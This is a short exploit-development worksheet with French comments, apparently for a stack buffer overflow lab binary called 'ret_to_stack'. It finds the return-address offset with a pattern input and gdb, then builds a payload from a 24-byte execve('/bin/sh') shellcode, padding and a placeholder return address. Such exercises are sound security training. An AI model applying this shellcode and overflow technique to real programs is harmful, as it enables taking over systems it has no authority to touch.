
#1 Trouver l'offset :
python3 -c 'print(b"A"*128+b"000A000B000C000D000E000F000G000H000I000J000K000L000M000N")' > input.bin
gdb ./ret_to_stack
# (gdb) disas main
# (gdb) b*0x00000000004011a8
# (gdb) run < input.bin
# (gdb) info frame
# > saved rip = ???

#2 Trouver un shellcode :
# https://shell-storm.org/shellcode/index.html
# Linux/x86-64 - execve("/bin/bash",{NULL},{NULL}) - 24 bytes by Joao
# shellcode + offset + (return address = shellcode address)
python3 -c 'print(\
bytes(\
[0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54,\
 0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05]\
) + b"A"*(128-24)+b"000A000B000..." + b"\xde\xad\xbe\xef\xde\xad\xbe\xef")' > input.bin


